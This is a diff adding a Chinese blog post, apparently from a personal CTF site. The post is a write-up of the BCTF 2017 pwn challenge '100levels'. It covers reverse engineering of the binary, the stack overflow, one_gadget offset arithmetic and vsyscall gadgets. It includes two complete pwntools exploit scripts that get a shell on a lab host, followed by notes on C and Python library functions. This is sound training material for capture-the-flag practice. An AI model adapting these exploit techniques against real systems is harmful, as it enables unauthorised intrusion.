@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>BCTF 2017 pwn 100levels | closefrom</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://closefrom.github.io/favicon.ico?v=1615649066608">
+<link rel="stylesheet" href="https://closefrom.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="（ps：pie入门题目）
+文件链接：https://pan.baidu.com/s/17pIc0RrfLRH9arMbJmJGjA
+提取码：4olb
+搭建环境：
+
+1.查看文件信息，保护机制
+
+只有NX和PIE开了的基础题
+2.ubuntu..." />
+    <meta name="keywords" content="pwn" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://closefrom.github.io">
+        <img src="https://closefrom.github.io/images/avatar.png?v=1615649066608" class="site-logo">
+        <h1 class="site-title">closefrom</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="https://closefrom.github.io/archives" class="site-nav">
+            文章汇总
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            文章标签分类
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      The deeper you explore, the more you close from the truth
+    </div>
+    <div class="site-footer">
+      <div>
+	<a href="https://www.zyglz.com"> © 资源管理站</a>
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	<p><span id="busuanzi_container_site_uv" style='display:none'>总访客人数量<span id="busuanzi_value_site_uv"></span>次</span></p>
+	<p><span id="busuanzi_container_site_pv" style='display:none'>本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
+</div>
+Powered by <a href="https://github.com/getgridea/gridea" target="_blank">closefrom</a> | <a class="rss" href="https://closefrom.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">BCTF 2017 pwn 100levels</h2>
+            <div class="post-date">2021-03-13</div>
+            
+            <div class="post-content" v-pre>
+              <p>（ps：pie入门题目）<br>
+文件链接：https://pan.baidu.com/s/17pIc0RrfLRH9arMbJmJGjA<br>
+提取码：4olb<br>
+搭建环境：<br>
+<img src="https://closefrom.github.io/post-images/1615577868406.png" alt="" loading="lazy"></p>
+<p>1.查看文件信息，保护机制<br>
+<img src="https://closefrom.github.io/post-images/1615577883726.png" alt="" loading="lazy"><br>
+只有NX和PIE开了的基础题</p>
+<p>2.ubuntu运行ida<em>64的远程调试文件，ida</em>64打开程序开始分析<br>
+<img src="https://closefrom.github.io/post-images/1615577899643.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/1615577909350.png" alt="" loading="lazy"><br>
+函数窗口中并没有可疑的函数（直接getshell之类的）。<br>
+<img src="https://closefrom.github.io/post-images/1615577921841.png" alt="" loading="lazy"><br>
+打开main函数，通过分析反汇编代码和给出的伪代码，可知：<br>
+sub_DDC进行数值初始化，sub_B69进行相应地信息打印。<br>
+接下来进入一个while循环中，紧接着进入另一个while循环，调用sub_DA5函数打印相应提示信息<br>
+<img src="https://closefrom.github.io/post-images/1615577932457.png" alt="" loading="lazy"><br>
+然后调用sub_DB00函数，读入一个字符，若此字符小于等于0则返回-1，否则，将字符用strtol函数强转为十进制数据，然后返回。返回值赋值给main函数的局部变量v3。若v3不为2则结束当前while循环，否则，调用sub_D06函数：<br>
+<img src="https://closefrom.github.io/post-images/1615577944504.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/1615577956172.png" alt="" loading="lazy"><br>
+结合反汇编和伪代码，可以知道，进入此函数后，rbp-110h位置存放着system函数的地址。unk_20208C属于bss段的未初始化数据，默认为0，则进入此函数后，不进入if语句中执行sprintf函数，仅仅是打印int转char的v1变量<br>
+接下来就是第二层while循环下面的语句：<br>
+若刚刚读入数字v3不为3则结束循环，若v3不为1则打印字符串并继续最外层的while循环。<br>
+若v3为1，则进入sub_B94函数：<br>
+<img src="https://closefrom.github.io/post-images/1615577970060.png" alt="" loading="lazy"><br>
+可以看到sub_B94的伪代码也还是挺长的。大致意思：<br>
+读入两个数字到局部变量v2,v3，若局部变量v2大于零则赋值给局部变量v5，然后局部变量v6等于v5和v3相加，若v6大于0则进入if(v6&gt;0)，若大于等于99则赋值给v7，否则输出字符串，以及对v7赋值100。(注：这里的局部变量v5,v6的位置都是rbp-110h，sub_D06函数的system函数地址也是在rbp-110h位置，用rsp表示为rsp+10h位置。）<br>
+接下来就是调用sub_E43函数，传入值v7。跟进到sub_E43函数：<br>
+<img src="https://closefrom.github.io/post-images/1615577985178.png" alt="" loading="lazy"></p>
+<p>（1）.查看伪代码明显看到第28行read函数存在栈溢出，可以覆盖返回地址，但是现在并没有什么有用的地址可以用于覆盖返回地址进行getshell。<br>
+（2）.可以发现代码中有用printf函数输出a1,a1即sub_B94函数的局部变量并且在栈中。<br>
+（3）.read函数读入的字符，会用strtol函数转为10进制赋值给局部变量v3并且与v8进行比较。比较结果作为返回值。<br>
+（4）.程序开头的第二个if语句，递归调用当前函数，第一个if语句位递归调用的终止条件<br>
+（5）.若第一次调用此函数，如传入值为2，在第二个if语句调用本身，输入的字符无法使函数返回1，则无法进行下面的栈溢出</p>
+<p>3.在提供的文件libc.so.6_x64中寻找有用的地址。<br>
+使用one_gadget，查找shell地址<br>
+<img src="https://closefrom.github.io/post-images/1615578049394.png" alt="" loading="lazy"><br>
+libc中的两地址间的距离与加载到程序后两地址的距离是不变的。<br>
+<img src="https://closefrom.github.io/post-images/1615578059208.png" alt="" loading="lazy"><br>
+即：system_add - one_gadget_add = 378  -&gt;  one_gadget = system_add - 378</p>
+<p>用gdb调试程序，查看vmmap，找vsyscall：<br>
+<img src="https://closefrom.github.io/post-images/1615578073414.png" alt="" loading="lazy"></p>
+<p>4.进行程序的动态调试：<br>
+<img src="https://closefrom.github.io/post-images/1615578086571.png" alt="" loading="lazy"><br>
+断点于sub_B00开始远程调试。<br>
+<img src="https://closefrom.github.io/post-images/1615578102242.png" alt="" loading="lazy"><br>
+第一次先输入2，进入sub_D06<br>
+<img src="https://closefrom.github.io/post-images/1615578116560.png" alt="" loading="lazy"><br>
+可以看到system在函数开头已经写入到了栈中，位置是rbp-110h<br>
+rbp为0x7ffe6de877d0<br>
+system函数在栈中地址为0x7ffe6de876c0。<br>
+然后进行一系列输出，退出当前函数。继续当前循环，这时直接填1，进入函数sub_B94：<br>
+<img src="https://closefrom.github.io/post-images/1615578129792.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/1615578140497.png" alt="" loading="lazy"><br>
+可以看到sub_B94函数的rbp跟sub_D06的rbp是一样的，rbp-110h存放的也是libc的system函数的地址。因此，通过上面对sub_B94分析可知，v5和v6都是指向栈中libc的system函数的，若读入的v2值大于0，则用v2值覆盖了system函数地址。同样，v3值的读入，也会改变v6的值-&gt;v6=v5+v3。<br>
+通过上面对one_gadget的寻找以及分析，可以使v5=system_add，也就是v2为0，v3为-378，则system函数地址就会变为one_gadget地址。just do it：<br>
+<img src="https://closefrom.github.io/post-images/1615578153900.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/1615578163143.png" alt="" loading="lazy"><br>
+可以看到成功改成了one_gadget_add。<br>
+<img src="https://closefrom.github.io/post-images/1615578178059.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/1615578186558.png" alt="" loading="lazy"><br>
+然后到了判v6大于0，进入if语句。v6肯定大于99所以，v7初始化为100。<br>
+之后调用sub_E43，传入v7（100），由于v7是100，所以调用了sub_E43函数一百次，拉到递归调用的最内层函数，即最后执行完的那次。<br>
+<img src="https://closefrom.github.io/post-images/1615578197685.png" alt="" loading="lazy"><br>
+可以看到返回地址与one_gadget_add 相差0x18h。<br>
+做法1-&gt;前面99次使得程序返回1，使得最后一次能进行栈溢出劫持rip,执行vsyscall，ret到one_gadget_add实现getshell</p>
+<p>做法2：<br>
+回到sub_E43函数<br>
+<img src="https://closefrom.github.io/post-images/1615578209906.png" alt="" loading="lazy"><br>
+可以看到用printf函数以%d输出a1（sub_B94函数的局部变量v7，在栈中）。并且看反汇编代码可以看到：<br>
+<img src="https://closefrom.github.io/post-images/1615578223770.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/1615578233420.png" alt="" loading="lazy"><br>
+a1在栈中的位置是rbp-0x34h，也就是用rbp进行相对定位的。<br>
+<img src="https://closefrom.github.io/post-images/1615578253617.png" alt="" loading="lazy"><br>
+离rbp最近的函数地址最后8位：0x38, 则可推：?-0x34 = 0x38 -&gt; ?=0x6c<br>
+所以可以这么做：在sub_B94中，第一次输入0，第二次输入2，这样就只调用2次sub_E43，第一次用栈溢出覆盖rbp一个字节-&gt;\x6c，并且使函数返回1，第二次则会打印出栈中的一个地址中的后32位，并且可以劫持rip。  printf中的%d（int）在64位中只能打印四个字节（8个16进制数）数据。<br>
+<img src="https://closefrom.github.io/post-images/1615578267146.png" alt="" loading="lazy"><br>
+然后若泄露出是函数地址，则结合给出的libc文件，算出偏移，算出one_gadget地址。，最后劫持rip进行getshell。</p>
+<p>5.编写exp</p>
+<pre><code>
+#做法1 exp
+from pwn import *
+
+context.binary = './100levels'
+link = remote("192.168.93.137","6666")
+libc_elf = ELF('libc.so.6_x64')
+vsyscall_add = 0xffffffffff600000
+link.sendlineafter("Choice:\n",'2')
+#link.recvuntil("FUN\n") ->可不加
+link.sendlineafter("Choice:\n",'1')
+link.sendlineafter("levels?\n",'0')
+link.sendlineafter("more?\n",'-378')
+
+for i in range(99):
+    link.recvuntil("Question: ")
+    answer1 = int(link.recvuntil(" ")[:-1])
+    link.recvuntil("* ")
+    answer2 = int(link.recvuntil(" ")[:-1])
+    link.sendlineafter("Answer:",str(answer1*answer2))
+    
+payload1 = 'A' * 0x30
+payload1 += 'B'* 0x8
+payload1 += p64(vsyscall_add) * 3
+#每个函数后面都有leave和retn
+#并且有上面看到的sub_E43的返回地址和one_gadget_add 的距离
+link.sendafter("Answer:",payload1)
+link.interactive()
+</code></pre>
+<p>运行exp-&gt;getshell-&gt;cat flag<br>
+<img src="https://closefrom.github.io/post-images/1615578316998.png" alt="" loading="lazy"></p>
+<pre><code>
+#做法2 exp
+#经过调试，发现程序加载地址都为0x000055XXXXXXXXXX-0x000056XXXXXXXXXX
+#libc的地址都为0x7fXXXXXXXXXX
+#已知8个16进制数，剩下两个随便填一下如：2a
+from pwn import *
+
+context.binary = './100levels'
+i=0
+
+while True:
+    try:
+        py_add = 0
+        i+=1
+        print i
+        link = remote("192.168.93.137","6666")
+        link.sendlineafter("Choice:\n",'1')
+        link.sendlineafter("levels?\n",'1')
+        link.sendlineafter("more?\n",'1')
+        link.recvuntil("Question: ")
+        a1 = int(link.recvuntil(" ")[:-1])
+        link.recvuntil("* ")
+        a2 = int(link.recvuntil(" ")[:-1])
+        a3 = str(a1*a2)
+        a4 = a3.ljust(0x30,'\x00')+'\x6c'
+        link.sendafter("Answer:",a4)
+        link.recvuntil("Level ")
+        answer = int(link.recvuntil("\n")[:-1])
+        if answer < 0:
+            answer = answer + 0x100000000
+#由于answer这个数的二进制最高位有可能是0或1，所以可能位有符号数（0），要处理
+        answer_end = answer + 0x7f2a00000000
+#通过ELF(libc文件).symbols['函数名']查找地址
+        if hex(answer_end)[-2:] == '6f':  #_IO_file_write+8F  e0+8f=16f
+            py_add = answer_end - 0xf88e0 - 0x8f
+        elif hex(answer_end)[-2:] == '00': #_IO_2_1_stdout
+            py_add = answer_end - 0x3c2600
+        elif hex(answer_end)[-2:] == '83': #_IO_2_1_stdout_+83  00+83=83
+            py_add = answer_end - 0x3c2600 - 0x83
+        elif hex(answer_end)[-2:] == '59': #_IO_do_write+79  e0+79=159
+            py_add = answer_end -0xf88e0 - 0x79
+        elif hex(answer_end)[-2:] == '20': #_IO_file_overflow
+            py_add = answer_end - 0x7c820
+        elif hex(answer_end)[-2:] == '8a': #puts+16a  20+6a=8a
+            py_add = answer_end - 0x70920 - 0x16a
+        one_gadget_add = py_add + 0x45526
+        if py_add == 0:
+            link.close()
+            continue
+        link.recvuntil("Question: ")
+        a1 = int(link.recvuntil(" ")[:-1])
+        link.recvuntil("* ")
+        a2 = int(link.recvuntil(" ")[:-1])
+        a3 = str(a1*a2)
+        a4 = a3.ljust(0x38,'\x00')+ p64(one_gadget_add)
+        link.sendafter("Answer:",a4)
+        io.recv(timeout=1)
+    except EOFError:
+        link.close()
+        continue
+    else:
+        link.interactive()
+        break
+</code></pre>
+<p>扩展：{<br>
+1.python ljust函数<br>
+ljust()方法语法：str.ljust(width[, fillchar])<br>
+width -- 指定字符串长度。<br>
+fillchar -- 填充字符，默认为空格。<br>
+返回值：返回一个原字符串左对齐,并使用空格填充至指定长度的新字符串。如果指定的长度小于原字符串的长度则返回原字符串。<br>
+例：<br>
+str = &quot;this is string example....wow!!!&quot;;<br>
+print str.ljust(50, '0');<br>
+输出：this is string example....wow!!!000000000000000000</p>
+<p>2.sprintf函数<br>
+int sprintf(char *string, char *format [,argument,...]);<br>
+string-- 这是指向一个字符数组的指针，该数组存储了 C 字符串。<br>
+format-- 这是字符串，包含了要被写入到字符串 str 的文本。它可以包含嵌入的 format 标签，format 标签可被随后的附加参数中指定的值替换，并按需求进行格式化。format 标签属性是%[flags][width][.precision][length]specifier<br>
+[argument]...：根据不同的 format 字符串，函数可能需要一系列的附加参数，每个参数包含了一个要被插入的值，替换了 format 参数中指定的每个 % 标签。参数的个数应与 % 标签的个数相同。<br>
+功能：把格式化的数据写入某个字符串缓冲区。<br>
+返回值：如果成功，则返回写入的字符总数，不包括字符串追加在字符串末尾的空字符。如果失败，则返回一个负数。</p>
+<p>例：</p>
+<pre><code>
+#include <stdio.h>
+int main( void )
+ 
+{
+   char  buffer[200], s[] = "computer", c = 'l';
+   int   i = 35, j;
+   float fp = 1.7320534f;
+   j  = sprintf( buffer,    "   String:    %s\n", s ); // C4996
+   j += sprintf( buffer + j, "   Character: %c\n", c ); // C4996
+   j += sprintf( buffer + j, "   Integer:   %d\n", i ); // C4996
+   j += sprintf( buffer + j, "   Real:      %f\n", fp );// C4996
+   printf( "Output:\n%s\ncharacter count = %d\n", buffer, j );
+      return 0;
+}
+/*
+输出结果：
+Output:
+String: computer 
+　　
+Character: l
+Integer: 35
+Real: 1.732053
+character count = 79
+*/
+</code></pre>
+<p>3.strtol函数<br>
+long int strtol(const char *str, char *<em>endptr, int base)<br>
+str -- 要转换为长整数的字符串。<br>
+endptr -- 对类型为 char</em> 的对象的引用，其值由函数设置为 str 中数值后的下一个字符。<br>
+base -- 基数，必须介于 2 和 36（包含）之间，或者是特殊值 0。<br>
+返回值：该函数返回转换后的长整数，如果没有执行有效的转换，则返回一个零值。<br>
+例：</p>
+<pre><code>
+#include <stdio.h>
+#include <stdlib.h>
+
+int main()
+{
+   char str[30] = "2030300 This is test";
+   char *ptr;
+   long ret;
+
+   ret = strtol(str, &ptr, 10);
+   printf("数字（无符号长整数）是 %ld\n", ret);
+   printf("字符串部分是 |%s|", ptr);
+
+   return(0);
+}
+/*
+输出：
+数字（无符号长整数）是 2030300
+字符串部分是 | This is test|
+*/
+</code></pre>
+<p>4.vsyscall<br>
+现代的Windows/*Unix操作系统都采用了分级保护的方式，内核代码位于R0，用户代码位于R3。许多对硬件和内核等的操作都会被包装成内核函数并提供一个接口给用户层代码调用，这个接口就是我们熟知的int 0x80/syscall+调用号模式。当我们每次调用这个接口时，为了保证数据的隔离，我们需要把当前的上下文(寄存器状态等)保存好，然后切换到内核态运行内核函数，然后将内核函数返回的结果放置到对应的寄存器和内存中，再恢复上下文，切换到用户模式。这一过程需要耗费一定的性能。对于某些系统调用，如gettimeofday来说，由于他们经常被调用，如果每次被调用都要这么来回折腾一遍，开销就会变成一个累赘。因此系统把几个常用的无参内核调用从内核中映射到用户空间中，这就是vsyscall<br>
+}</p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://closefrom.github.io/tag/mQz58myZ-/" class="tag">
+                    pwn
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://closefrom.github.io/post/2018-an-heng-bei-pwn-babypie/">
+                  <h3 class="post-title">
+                    2018 安恒杯 pwn babypie
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
